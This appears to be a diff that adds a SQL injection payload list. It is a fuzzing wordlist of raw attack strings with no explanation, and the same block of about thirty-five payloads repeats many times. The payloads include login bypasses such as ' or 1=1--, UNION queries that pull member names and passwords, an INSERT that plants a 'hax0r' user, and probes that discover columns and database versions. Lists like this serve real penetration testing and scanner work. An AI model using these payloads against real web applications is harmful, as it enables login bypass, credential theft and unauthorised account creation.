+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,2,NULL,NULL WHERE = 2 -- #
+11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –- #
+11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –- #
+'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* #
+@@version #
+INSERT into members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10) #
+UNION SELECT null, version(), null;#
+UNION SELECT null, sqlite_version(),null;#
+SELECT char(64) #
+SELECT CHR(64) #
+SELECTheader, txt FROM news UNION ALL SELECT name, pass FROM members #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+SELECTheader FROM news UNION ALL SELECT name COLLATE SL_Latin1_General_Cp1254_CS_AS FROM members #
+admin' -- #
+admin' # #
+admin'/**
+' or 1=1-- #
+' or 1=1# #
+' or 1=1/*
+') or '1'='1-- #
+') or ('z' = 'z-- #
+' UNION SELECT 1, 'anotheruser', 'any string', 1-- #
+admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' #
+' HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- #
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- #
+ORDER BY 1-- #
+ORDER BY 2-- #
+ORDER BY N-- #
+' UNION SELECT sum(columntofind) from users-- #
+SELECT * FROM table1 where id = -1 UNION ALL SELECT null, null, null, null, convert(image,1), null, null,null, null,  null, null, null, null, null, null, null, null-- #
+11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE = 2 –- #
+11223344) UNION SELECT 1,NULL,NULL,NULL WHERE = 2 –- #
